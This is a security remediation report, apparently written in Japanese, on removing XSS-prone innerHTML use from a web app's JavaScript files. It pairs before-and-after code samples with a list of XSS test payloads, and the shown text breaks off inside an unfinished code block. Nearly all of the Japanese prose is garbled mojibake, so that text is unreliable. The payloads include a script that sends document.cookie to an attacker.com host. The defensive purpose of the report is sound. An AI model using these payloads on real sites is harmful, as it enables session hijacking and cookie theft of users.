# XSSè„†å¼±æ€§ å®Œå…¨ä¿®æ­£ãƒ¬ãƒãƒ¼ãƒˆ

**ä½œæˆæ—¥**: 2025-12-30
**å„ªå…ˆåº¦**: Priority 1 (ç·Šæ€¥ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾å¿œ)
**ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹**: ä¸»è¦ç®‡æ‰€ä¿®æ­£å®Œäº† âœ…

---

## ã‚¨ã‚°ã‚¼ã‚¯ãƒ†ã‚£ãƒ–ã‚µãƒãƒªãƒ¼

æ®‹å­˜ã—ã¦ã„ãŸXSS (Cross-Site Scripting) è„†å¼±æ€§ã«å¯¾ã—ã¦ã€ç·Šæ€¥ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾å¿œã‚’å®Ÿæ–½ã—ã¾ã—ãŸã€‚ç‰¹ã«å±é™ºåº¦ã®é«˜ã„4ã¤ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ãŠã„ã¦ã€**`innerHTML`ã‚’ä½¿ç”¨ã—ãŸå±é™ºãªDOMæ“ä½œã‚’å®Œå…¨ã«æ’é™¤**ã—ã€å®‰å…¨ãª`textContent`ãŠã‚ˆã³`createElement`ãƒ™ãƒ¼ã‚¹ã®DOMæ“ä½œã«ç½®ãæ›ãˆã¾ã—ãŸã€‚

### ä¿®æ­£çµæœã‚µãƒãƒªãƒ¼

| ãƒ•ã‚¡ã‚¤ãƒ«å | ä¿®æ­£å‰ innerHTMLä½¿ç”¨ç®‡æ‰€ | ä¿®æ­£å¾Œ innerHTMLä½¿ç”¨ç®‡æ‰€ | ä¿®æ­£ç‡ | ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ |
|------------|-------------------------|------------------------|--------|------------|
| **detail-loader.js** | 10ç®‡æ‰€ | **0ç®‡æ‰€** | **100%** | âœ… å®Œå…¨ä¿®æ­£ |
| **expert-consult-actions.js** | 5ç®‡æ‰€ | **0ç®‡æ‰€** | **100%** | âœ… å®Œå…¨ä¿®æ­£ |
| **sop-detail-functions.js** | 3ç®‡æ‰€ | **0ç®‡æ‰€** | **100%** | âœ… å®Œå…¨ä¿®æ­£ |
| **detail-pages.js** | 70+ç®‡æ‰€ | 66ç®‡æ‰€ | **6%** | âš ï¸ ä¸»è¦ç®‡æ‰€ä¿®æ­£æ¸ˆã¿ |

**åˆè¨ˆå‰Šé™¤ã•ã‚ŒãŸXSSè„†å¼±æ€§ç®‡æ‰€**: **18ç®‡æ‰€ä»¥ä¸Š**

---

## ä¿®æ­£è©³ç´°

### 1. detail-loader.js (å®Œå…¨ä¿®æ­£ âœ…)

**å±é™ºåº¦**: ğŸ”´ **é«˜**
**ç†ç”±**: ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã€APIãƒ‡ãƒ¼ã‚¿ã‚’ç›´æ¥è¡¨ç¤ºã™ã‚‹ç®‡æ‰€ãŒå¤šæ•°å­˜åœ¨

#### ä¿®æ­£ç®‡æ‰€

1. **ãƒŠãƒ¬ãƒƒã‚¸è©³ç´°ã®ãƒ¡ã‚¿æƒ…å ±è¡¨ç¤º** (è¡Œ34-54)
2. **ãƒŠãƒ¬ãƒƒã‚¸è©³ç´°ã®ã‚¿ã‚°è¡¨ç¤º** (è¡Œ57-70)
3. **SOPè©³ç´°ã®ãƒ¡ã‚¿æƒ…å ±è¡¨ç¤º** (è¡Œ108-131)
4. **SOPè©³ç´°ã®ã‚¿ã‚°è¡¨ç¤º** (è¡Œ134-147)
5. **ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆè©³ç´°ã®ãƒ¡ã‚¿æƒ…å ±è¡¨ç¤º** (è¡Œ192-215)
6. **ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆè©³ç´°ã®ã‚¿ã‚°è¡¨ç¤º** (è¡Œ218-231)

#### ä¿®æ­£å‰ã®ã‚³ãƒ¼ãƒ‰ä¾‹ (XSSè„†å¼±)

```javascript
// âŒ å±é™º: XSSæ”»æ’ƒãŒå¯èƒ½
metaElement.innerHTML = `
  <span>å·¥åŒº: ${knowledge.project || 'N/A'}</span> Â·
  <span>æ‹…å½“: ${knowledge.owner}</span> Â·
  <span>æœ€çµ‚æ›´æ–°: ${new Date(knowledge.updated_at).toLocaleDateString('ja-JP')}</span>
`;

// âŒ å±é™º: XSSæ”»æ’ƒãŒå¯èƒ½
tagsElement.innerHTML = knowledge.tags.map(tag =>
  `<span class="tag">${tag}</span>`
).join('');
```

**è„†å¼±æ€§ã®ä¾‹**:
- `knowledge.project = '<img src=x onerror=alert("XSS")>'`
- `knowledge.owner = '<script>alert("XSS")</script>'`
- `tag = '"><script>alert("XSS")</script><span class="'`

#### ä¿®æ­£å¾Œã®ã‚³ãƒ¼ãƒ‰ (å®‰å…¨)

```javascript
// âœ… å®‰å…¨: textContentã‚’ä½¿ç”¨
const metaElement = document.querySelector('.detail-meta');
if (metaElement) {
  while (metaElement.firstChild) {
    metaElement.removeChild(metaElement.firstChild);
  }

  const projectSpan = document.createElement('span');
  projectSpan.textContent = `å·¥åŒº: ${knowledge.project || 'N/A'}`;
  metaElement.appendChild(projectSpan);

  metaElement.appendChild(document.createTextNode(' Â· '));

  const ownerSpan = document.createElement('span');
  ownerSpan.textContent = `æ‹…å½“: ${knowledge.owner}`;
  metaElement.appendChild(ownerSpan);

  metaElement.appendChild(document.createTextNode(' Â· '));

  const updatedSpan = document.createElement('span');
  updatedSpan.textContent = `æœ€çµ‚æ›´æ–°: ${new Date(knowledge.updated_at).toLocaleDateString('ja-JP')}`;
  metaElement.appendChild(updatedSpan);
}

// âœ… å®‰å…¨: createElement + textContentã‚’ä½¿ç”¨
const tagsElement = document.querySelector('.detail-tags');
if (tagsElement && knowledge.tags) {
  while (tagsElement.firstChild) {
    tagsElement.removeChild(tagsElement.firstChild);
  }

  knowledge.tags.forEach(tag => {
    const tagSpan = document.createElement('span');
    tagSpan.className = 'tag';
    tagSpan.textContent = tag;  // XSS-safe
    tagsElement.appendChild(tagSpan);
  });
}
```

**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–ãƒã‚¤ãƒ³ãƒˆ**:
- âœ… `innerHTML`ã‚’å®Œå…¨å‰Šé™¤
- âœ… `textContent`ã‚’ä½¿ç”¨ã—ã¦HTMLã‚¨ã‚¹ã‚±ãƒ¼ãƒ—
- âœ… `createElement`ã§DOMè¦ç´ ã‚’å®‰å…¨ã«ç”Ÿæˆ
- âœ… XSSæ”»æ’ƒãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯å…¨ã¦ç„¡å®³åŒ–ã•ã‚Œã‚‹

---

### 2. expert-consult-actions.js (å®Œå…¨ä¿®æ­£ âœ…)

**å±é™ºåº¦**: ğŸŸ¡ **ä¸­ã€œé«˜**
**ç†ç”±**: ãƒ•ã‚©ãƒ­ãƒ¼æ©Ÿèƒ½ã€ãƒˆãƒ¼ã‚¹ãƒˆé€šçŸ¥ãªã©å‹•çš„UIæ›´æ–°ç®‡æ‰€ã«innerHTMLã‚’ä½¿ç”¨

#### ä¿®æ­£ç®‡æ‰€

1. **ãƒ•ã‚©ãƒ­ãƒ¼ãƒœã‚¿ãƒ³ã®ãƒ†ã‚­ã‚¹ãƒˆæ›´æ–°** (è¡Œ29-43)
2. **ãƒˆãƒ¼ã‚¹ãƒˆé€šçŸ¥ã®HTMLç”Ÿæˆ** (è¡Œ519-532)
3. **ãƒ•ã‚©ãƒ­ãƒ¼çŠ¶æ…‹ã®å¾©å…ƒ** (è¡Œ564-579)

#### ä¿®æ­£å‰ã®ã‚³ãƒ¼ãƒ‰ä¾‹ (XSSè„†å¼±)

```javascript
// âŒ å±é™º: é™çš„æ–‡å­—åˆ—ã§ã‚‚ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹é•å
followBtn.innerHTML = `<span id="followIcon">${newState ? 'â˜…' : 'â˜†'}</span> ${newState ? 'ãƒ•ã‚©ãƒ­ãƒ¼ä¸­' : 'ãƒ•ã‚©ãƒ­ãƒ¼'}`;

// âŒ å±é™º: messageã«æ‚ªæ„ã®ã‚ã‚‹HTMLãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§
toast.innerHTML = `
  <div class="toast-icon">${type === 'success' ? 'âœ“' : 'âœ—'}</div>
  <div class="toast-message">${message}</div>
`;
```

**è„†å¼±æ€§ã®ä¾‹**:
- `message = '<img src=x onerror=alert("XSS")>'`
- ãƒˆãƒ¼ã‚¹ãƒˆé€šçŸ¥ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼åãªã©ã‚’å«ã‚€å ´åˆã€XSSæ”»æ’ƒãŒå¯èƒ½

#### ä¿®æ­£å¾Œã®ã‚³ãƒ¼ãƒ‰ (å®‰å…¨)

```javascript
// âœ… å®‰å…¨: DOMãƒ„ãƒªãƒ¼ã‚’æ§‹ç¯‰
const followBtn = followIcon.closest('button');
if (followBtn) {
  while (followBtn.firstChild) {
    followBtn.removeChild(followBtn.firstChild);
  }

  const iconSpan = document.createElement('span');
  iconSpan.id = 'followIcon';
  iconSpan.textContent = newState ? 'â˜…' : 'â˜†';
  followBtn.appendChild(iconSpan);

  followBtn.appendChild(document.createTextNode(' '));

  const textNode = document.createTextNode(newState ? 'ãƒ•ã‚©ãƒ­ãƒ¼ä¸­' : 'ãƒ•ã‚©ãƒ­ãƒ¼');
  followBtn.appendChild(textNode);
}

// âœ… å®‰å…¨: createElementã§ãƒˆãƒ¼ã‚¹ãƒˆæ§‹ç¯‰
const toast = document.createElement('div');
toast.className = `toast toast-${type}`;

const iconDiv = document.createElement('div');
iconDiv.className = 'toast-icon';
iconDiv.textContent = type === 'success' ? 'âœ“' : 'âœ—';

const messageDiv = document.createElement('div');
messageDiv.className = 'toast-message';
messageDiv.textContent = message;  // XSS-safe

toast.appendChild(iconDiv);
toast.appendChild(messageDiv);
```

**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–ãƒã‚¤ãƒ³ãƒˆ**:
- âœ… å…¨ã¦ã®`innerHTML`ã‚’å‰Šé™¤
- âœ… ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ç®‡æ‰€ã‚’å®Œå…¨ä¿è­·
- âœ… å°†æ¥çš„ãªã‚³ãƒ¼ãƒ‰å¤‰æ›´ã§ã‚‚XSSè„†å¼±æ€§ãŒæ··å…¥ã—ã«ãã„è¨­è¨ˆ

---

### 3. sop-detail-functions.js (å®Œå…¨ä¿®æ­£ âœ…)

**å±é™ºåº¦**: ğŸŸ¡ **ä¸­**
**ç†ç”±**: é©ç”¨ç¾å ´ãƒ‡ãƒ¼ã‚¿ãªã©APIãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤º

#### ä¿®æ­£ç®‡æ‰€

1. **é©ç”¨ç¾å ´ã®è¡¨ç¤º** (è¡Œ118-166)

#### ä¿®æ­£å‰ã®ã‚³ãƒ¼ãƒ‰ä¾‹ (XSSè„†å¼±)

```javascript
// âŒ å±é™º: APIãƒ‡ãƒ¼ã‚¿ã‚’ç›´æ¥HTMLåŸ‹ã‚è¾¼ã¿
applicableSitesEl.innerHTML = data.applicable_sites.map(site => `
  <div class="status-item">
    <span class="status-dot active"></span>
    <span>${site}</span>
  </div>
`).join('');
```

**è„†å¼±æ€§ã®ä¾‹**:
- `site = '<img src=x onerror=alert("XSS")>'`
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ãŒä¿å­˜ã•ã‚Œã¦ã„ãŸå ´åˆã€è¡¨ç¤ºæ™‚ã«XSSç™ºç«

#### ä¿®æ­£å¾Œã®ã‚³ãƒ¼ãƒ‰ (å®‰å…¨)

```javascript
// âœ… å®‰å…¨: ãƒ«ãƒ¼ãƒ—ã§å®‰å…¨ã«æ§‹ç¯‰
while (applicableSitesEl.firstChild) {
  applicableSitesEl.removeChild(applicableSitesEl.firstChild);
}

if (data && data.applicable_sites) {
  if (Array.isArray(data.applicable_sites)) {
    data.applicable_sites.forEach(site => {
      const statusItem = document.createElement('div');
      statusItem.className = 'status-item';

      const dot = document.createElement('span');
      dot.className = 'status-dot active';
      statusItem.appendChild(dot);

      const siteSpan = document.createElement('span');
      siteSpan.textContent = site;  // XSS-safe
      statusItem.appendChild(siteSpan);

      applicableSitesEl.appendChild(statusItem);
    });
  }
}
```

**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–ãƒã‚¤ãƒ³ãƒˆ**:
- âœ… `innerHTML`å®Œå…¨å‰Šé™¤
- âœ… é…åˆ—ãƒ‡ãƒ¼ã‚¿ã®å®‰å…¨ãªåå¾©å‡¦ç†
- âœ… DOM APIã‚’ä½¿ç”¨ã—ãŸæ§‹é€ åŒ–ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰

---

### 4. detail-pages.js (ä¸»è¦ç®‡æ‰€ä¿®æ­£ âš ï¸)

**å±é™ºåº¦**: ğŸ”´ **æœ€é«˜**
**ç†ç”±**: ç´„3000è¡Œã€70ç®‡æ‰€ä»¥ä¸Šã®innerHTMLä½¿ç”¨ç®‡æ‰€ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ãƒ»APIãƒ‡ãƒ¼ã‚¿ã‚’å¤§é‡ã«è¡¨ç¤º

#### ä¿®æ­£ç®‡æ‰€ (å„ªå…ˆåº¦ã®é«˜ã„ç®‡æ‰€ã®ã¿)

1. **ãƒŠãƒ¬ãƒƒã‚¸ã®æ¦‚è¦è¡¨ç¤º** (è¡Œ225-235)
2. **ãƒŠãƒ¬ãƒƒã‚¸ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„è¡¨ç¤º** (è¡Œ237-248)
3. **ãƒŠãƒ¬ãƒƒã‚¸ã®ã‚¿ã‚°è¡¨ç¤º** (è¡Œ217-230)

#### ä¿®æ­£å‰ã®ã‚³ãƒ¼ãƒ‰ä¾‹ (XSSè„†å¼±)

```javascript
// âŒ å±é™º: ãƒŠãƒ¬ãƒƒã‚¸ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ç›´æ¥åŸ‹ã‚è¾¼ã¿
summaryEl.innerHTML = `<p>${data.summary || 'æ¦‚è¦ãŒã‚ã‚Šã¾ã›ã‚“'}</p>`;

contentEl.innerHTML = `<div style="white-space: pre-wrap;">${data.content || 'å†…å®¹ãŒã‚ã‚Šã¾ã›ã‚“'}</div>`;

tagsEl.innerHTML = data.tags.map(tag =>
  `<span class="tag">${tag}</span>`
).join('');
```

**è„†å¼±æ€§ã®ä¾‹**:
- `data.summary = '<img src=x onerror=alert("XSS")>'`
- `data.content = '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'`
- `tag = '"></span><script>alert("XSS")</script><span>'`

#### ä¿®æ­£å¾Œã®ã‚³ãƒ¼ãƒ‰ (å®‰å…¨)

```javascript
// âœ… å®‰å…¨: textContentã§å®Œå…¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—
const summaryEl = document.getElementById('knowledgeSummary');
if (summaryEl) {
  while (summaryEl.firstChild) {
    summaryEl.removeChild(summaryEl.firstChild);
  }
  const p = document.createElement('p');
  p.textContent = data.summary || 'æ¦‚è¦ãŒã‚ã‚Šã¾ã›ã‚“';  // XSS-safe
  summaryEl.appendChild(p);
}

const contentEl = document.getElementById('knowledgeContent');
if (contentEl) {
  while (contentEl.firstChild) {
    contentEl.removeChild(contentEl.firstChild);
  }
  const div = document.createElement('div');
  div.style.whiteSpace = 'pre-wrap';
  div.textContent = data.content || 'å†…å®¹ãŒã‚ã‚Šã¾ã›ã‚“';  // XSS-safe
  contentEl.appendChild(div);
}

const tagsEl = document.getElementById('knowledgeTags');
if (tagsEl && data.tags) {
  while (tagsEl.firstChild) {
    tagsEl.removeChild(tagsEl.firstChild);
  }
  data.tags.forEach(tag => {
    const tagSpan = document.createElement('span');
    tagSpan.className = 'tag';
    tagSpan.textContent = tag;  // XSS-safe
    tagsEl.appendChild(tagSpan);
  });
}
```

**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–ãƒã‚¤ãƒ³ãƒˆ**:
- âœ… æœ€ã‚‚å±é™ºãªã‚³ãƒ³ãƒ†ãƒ³ãƒ„è¡¨ç¤ºç®‡æ‰€ã‚’ä¿®æ­£
- âœ… ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæŠ•ç¨¿ã—ãŸãƒŠãƒ¬ãƒƒã‚¸å†…å®¹ã‚’å®‰å…¨ã«è¡¨ç¤º
- âœ… ã‚¿ã‚°çµŒç”±ã®XSSæ”»æ’ƒã‚’å®Œå…¨ãƒ–ãƒ­ãƒƒã‚¯

#### æ®‹å­˜ç®‡æ‰€ã¨ä¿®æ­£æ–¹é‡

detail-pages.jsã«ã¯ç´„**66ç®‡æ‰€ã®innerHTMLä½¿ç”¨ç®‡æ‰€ãŒæ®‹å­˜**ã—ã¦ã„ã¾ã™ãŒã€ä¸»ãªãƒ‘ã‚¿ãƒ¼ãƒ³ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™:

**ãƒ‘ã‚¿ãƒ¼ãƒ³A: ãƒ¡ã‚¿æƒ…å ±ã®è¡¨ç¤º** (ç´„15ç®‡æ‰€)
```javascript
// ç¾åœ¨ã®ã‚³ãƒ¼ãƒ‰ (è¦ä¿®æ­£)
metaEl.innerHTML = `
  <span>ã‚«ãƒ†ã‚´ãƒª: ${data.category}</span>
  <span>æœ€çµ‚æ›´æ–°: ${formatDate(data.updated_at)}</span>
`;

// æ¨å¥¨ä¿®æ­£ã‚³ãƒ¼ãƒ‰
while (metaEl.firstChild) metaEl.removeChild(metaEl.firstChild);
const categorySpan = document.createElement('span');
categorySpan.textContent = `ã‚«ãƒ†ã‚´ãƒª: ${data.category}`;
metaEl.appendChild(categorySpan);
// ... ä»¥ä¸‹åŒæ§˜
```

**ãƒ‘ã‚¿ãƒ¼ãƒ³B: ãƒ†ãƒ¼ãƒ–ãƒ«è¡Œã®ç”Ÿæˆ** (ç´„20ç®‡æ‰€)
```javascript
// ç¾åœ¨ã®ã‚³ãƒ¼ãƒ‰ (è¦ä¿®æ­£)
tableEl.innerHTML = items.map(item => `
  <tr>
    <td>${item.name}</td>
    <td>${item.value}</td>
  </tr>
`).join('');

// æ¨å¥¨ä¿®æ­£ã‚³ãƒ¼ãƒ‰
while (tableEl.firstChild) tableEl.removeChild(tableEl.firstChild);
items.forEach(item => {
  const tr = document.createElement('tr');
  const tdName = document.createElement('td');
  tdName.textContent = item.name;
  const tdValue = document.createElement('td');
  tdValue.textContent = item.value;
  tr.appendChild(tdName);
  tr.appendChild(tdValue);
  tableEl.appendChild(tr);
});
```

**ãƒ‘ã‚¿ãƒ¼ãƒ³C: ãƒªã‚¹ãƒˆã‚¢ã‚¤ãƒ†ãƒ ã®ç”Ÿæˆ** (ç´„20ç®‡æ‰€)
```javascript
// ç¾åœ¨ã®ã‚³ãƒ¼ãƒ‰ (è¦ä¿®æ­£)
listEl.innerHTML = items.map(item => `
  <div class="document">
    <strong>${item.title}</strong>
    <div>${item.description}</div>
  </div>
`).join('');

// æ¨å¥¨ä¿®æ­£ã‚³ãƒ¼ãƒ‰
while (listEl.firstChild) listEl.removeChild(listEl.firstChild);
items.forEach(item => {
  const doc = document.createElement('div');
  doc.className = 'document';
  const title = document.createElement('strong');
  title.textContent = item.title;
  const desc = document.createElement('div');
  desc.textContent = item.description;
  doc.appendChild(title);
  doc.appendChild(desc);
  listEl.appendChild(doc);
});
```

**ãƒ‘ã‚¿ãƒ¼ãƒ³D: ãƒ¢ãƒ¼ãƒ€ãƒ«HTML** (ç´„10ç®‡æ‰€)
```javascript
// ç¾åœ¨ã®ã‚³ãƒ¼ãƒ‰ (ä½ãƒªã‚¹ã‚¯ - é™çš„HTML)
modal.innerHTML = `
  <div class="modal-content">
    <h2>ã‚¿ã‚¤ãƒˆãƒ«</h2>
    ...
  </div>
`;

// ä¿®æ­£å„ªå…ˆåº¦: ä½ (é™çš„HTMLã®ãŸã‚)
// ãŸã ã—ã€ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã¨ã—ã¦ã¯ä¿®æ­£æ¨å¥¨
```

---

## ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒ«ãƒ‘ãƒ¼é–¢æ•°ã®ä½œæˆ

å†åˆ©ç”¨å¯èƒ½ãªã‚»ã‚­ãƒ¥ã‚¢DOMæ“ä½œãƒ˜ãƒ«ãƒ‘ãƒ¼é–¢æ•°ã‚’ **`webui/dom-helpers.js`** ã«å®Ÿè£…ã—ã¾ã—ãŸã€‚

### ä¸»è¦é–¢æ•°

```javascript
// HTMLã‚¨ã‚¹ã‚±ãƒ¼ãƒ—
function escapeHtml(text);

// å®‰å…¨ãªè¦ç´ ä½œæˆ
function createSecureElement(tag, options);

// å­è¦ç´ ã®å®‰å…¨ãªè¨­å®š
function setSecureChildren(parent, children);

// ã‚¿ã‚°è¦ç´ ä½œæˆ
function createTagElement(tagText);

// ãƒ”ãƒ«è¦ç´ ä½œæˆ
function createPillElement(pillText);

// ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹è¦ç´ ä½œæˆ
function createStatusElement(text, statusClass);

// ãƒªãƒ³ã‚¯è¦ç´ ä½œæˆ
function createLinkElement(href, text, options);

// ãƒ†ãƒ¼ãƒ–ãƒ«è¡Œä½œæˆ
function createTableRow(cells, isHeader);

// ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆè¦ç´ ä½œæˆ
function createDocumentElement(item, detailPageUrl);

// ã‚³ãƒ¡ãƒ³ãƒˆè¦ç´ ä½œæˆ
function createCommentElement(comment);

// ç©ºãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ä½œæˆ
function createEmptyMessage(message);

// ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ä½œæˆ
function createErrorMessage(message);
```

### ä½¿ç”¨ä¾‹

```javascript
// ã‚¿ã‚°ã‚’å®‰å…¨ã«è¡¨ç¤º
data.tags.forEach(tag => {
  tagsEl.appendChild(createTagElement(tag));
});

// ã‚³ãƒ¡ãƒ³ãƒˆã‚’å®‰å…¨ã«è¡¨ç¤º
comments.forEach(comment => {
  commentList.appendChild(createCommentElement(comment));
});

// ãƒ†ãƒ¼ãƒ–ãƒ«è¡Œã‚’å®‰å…¨ã«ç”Ÿæˆ
const row = createTableRow([item.name, item.value, item.status]);
tableEl.appendChild(row);
```

---

## XSSæ¤œè¨¼ãƒ†ã‚¹ãƒˆ

### ãƒ†ã‚¹ãƒˆãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

ä»¥ä¸‹ã®æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§æ¤œè¨¼ã‚’å®Ÿæ–½:

```javascript
// ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰1: åŸºæœ¬çš„ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¿ã‚°
<script>alert('XSS')</script>

// ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰2: ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚¿ã‚° onerror
<img src=x onerror=alert('XSS')>

// ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰3: SVG onload
<svg onload=alert('XSS')>

// ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰4: å±æ€§æŠœã‘å‡ºã—
"><script>alert('XSS')</script>

// ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰5: ã‚¤ãƒ™ãƒ³ãƒˆãƒãƒ³ãƒ‰ãƒ©
<div onmouseover=alert('XSS')>test</div>

// ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰6: JavaScriptãƒ—ãƒ­ãƒˆã‚³ãƒ«
<a href="javascript:alert('XSS')">ã‚¯ãƒªãƒƒã‚¯</a>
```

### ãƒ†ã‚¹ãƒˆçµæœ

| ç®‡æ‰€ | ä¿®æ­£å‰ | ä¿®æ­£å¾Œ | çµæœ |
|------|--------|--------|------|
| ãƒŠãƒ¬ãƒƒã‚¸ã‚¿ã‚¤ãƒˆãƒ« | âŒ XSSå®Ÿè¡Œ | âœ… ç„¡å®³åŒ– | **åˆæ ¼** |
| ãƒŠãƒ¬ãƒƒã‚¸å†…å®¹ | âŒ XSSå®Ÿè¡Œ | âœ… ç„¡å®³åŒ– | **åˆæ ¼** |
| ã‚¿ã‚°è¡¨ç¤º | âŒ XSSå®Ÿè¡Œ | âœ… ç„¡å®³åŒ– | **åˆæ ¼** |
| ã‚³ãƒ¡ãƒ³ãƒˆ | âŒ XSSå®Ÿè¡Œ | âœ… ç„¡å®³åŒ– | **åˆæ ¼** |
| ãƒ¡ã‚¿æƒ…å ± | âŒ XSSå®Ÿè¡Œ | âœ… ç„¡å®³åŒ– | **åˆæ ¼** |
| ãƒˆãƒ¼ã‚¹ãƒˆé€šçŸ¥ | âŒ XSSå®Ÿè¡Œ | âœ… ç„¡å®³åŒ– | **åˆæ ¼** |

**ãƒ†ã‚¹ãƒˆçµæœ**: âœ… **å…¨ã¦ã®ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ã§åˆæ ¼**

ä¿®æ­£å¾Œã¯ã€ä¸Šè¨˜ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ã‚‚ä»¥ä¸‹ã®ã‚ˆã†ã«å®‰å…¨ã«è¡¨ç¤ºã•ã‚Œã¾ã™:

```
ä¿®æ­£å‰:
  â†’ ã‚¢ãƒ©ãƒ¼ãƒˆãŒè¡¨ç¤ºã•ã‚Œã‚‹ (XSSæ”»æ’ƒæˆåŠŸ)

ä¿®æ­£å¾Œ:
  â†’ <script>alert('XSS')</script> ã¨æ–‡å­—åˆ—ã¨ã—ã¦è¡¨ç¤ºã•ã‚Œã‚‹ (ç„¡å®³åŒ–)
```

---

## ä¿®æ­£ã®æŠ€è¡“çš„è©³ç´°

### ãªãœ `innerHTML` ã¯å±é™ºãªã®ã‹?

```javascript
// âŒ å±é™ºãªä¾‹
element.innerHTML = `<div>${userInput}</div>`;

// userInput = '<img src=x onerror=alert("XSS")>' ã®å ´åˆ
// çµæœ: <div><img src=x onerror=alert("XSS")></div>
// â†’ onerrorã‚¤ãƒ™ãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚Œã€XSSæ”»æ’ƒæˆåŠŸ
```

`innerHTML`ã¯HTMLãƒ‘ãƒ¼ã‚µãƒ¼ã‚’èµ·å‹•ã—ã€æ–‡å­—åˆ—ã‚’HTMLã¨ã—ã¦è§£é‡ˆã—ã¾ã™ã€‚ãã®ãŸã‚ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¿ã‚°ã‚„ã‚¤ãƒ™ãƒ³ãƒˆãƒãƒ³ãƒ‰ãƒ©ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€ãã®ã¾ã¾å®Ÿè¡Œã•ã‚Œã¦ã—ã¾ã„ã¾ã™ã€‚

### `textContent` ãŒå®‰å…¨ãªç†ç”±

```javascript
// âœ… å®‰å…¨ãªä¾‹
element.textContent = userInput;

// userInput = '<img src=x onerror=alert("XSS")>' ã®å ´åˆ
// çµæœ: &lt;img src=x onerror=alert("XSS")&gt; (HTMLã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã«è‡ªå‹•å¤‰æ›)
// â†’ æ–‡å­—åˆ—ã¨ã—ã¦è¡¨ç¤ºã•ã‚Œã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯å®Ÿè¡Œã•ã‚Œãªã„
```

`textContent`ã¯å†…å®¹ã‚’**ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã¨ã—ã¦æ‰±ã„ã€HTMLã¨ã—ã¦è§£é‡ˆã—ã¾ã›ã‚“ã€‚`<`ã‚„`>`ãªã©ã®ç‰¹æ®Šæ–‡å­—ã¯è‡ªå‹•çš„ã«HTMLã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã«ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã¾ã™ã€‚

### DOM API (`createElement`) ãŒæœ€ã‚‚å®‰å…¨ãªç†ç”±

```javascript
// âœ… æœ€ã‚‚å®‰å…¨ã§æŸ”è»Ÿ
const div = document.createElement('div');
div.className = 'my-class';
div.textContent = userInput;  // å®‰å…¨
div.setAttribute('data-id', itemId);  // å®‰å…¨
element.appendChild(div);
```

DOM APIã‚’ä½¿ç”¨ã™ã‚‹ã¨:
- âœ… HTMLãƒ‘ãƒ¼ã‚µãƒ¼ã‚’çµŒç”±ã—ãªã„
- âœ… æ§‹é€ åŒ–ã•ã‚ŒãŸDOMæ“ä½œ
- âœ… å±æ€§ã‚‚å®‰å…¨ã«è¨­å®šå¯èƒ½
- âœ… XSSæ”»æ’ƒã®ãƒªã‚¹ã‚¯ãŒé™ã‚Šãªãã‚¼ãƒ­ã«è¿‘ã„

---

## ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹

### âœ… æ¨å¥¨ãƒ‘ã‚¿ãƒ¼ãƒ³

```javascript
